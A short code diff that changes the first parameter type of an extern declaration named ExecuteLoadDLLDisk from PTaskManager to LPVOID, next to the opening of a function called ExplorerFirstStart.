@@ -12,7 +12,7 @@
 
 //---------------------------------------------------------------------------
 
-extern bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args);
+extern bool ExecuteLoadDLLDisk(LPVOID, PCHAR Command, PCHAR Args);
 
 void ExplorerFirstStart(PEventData Data)
 {
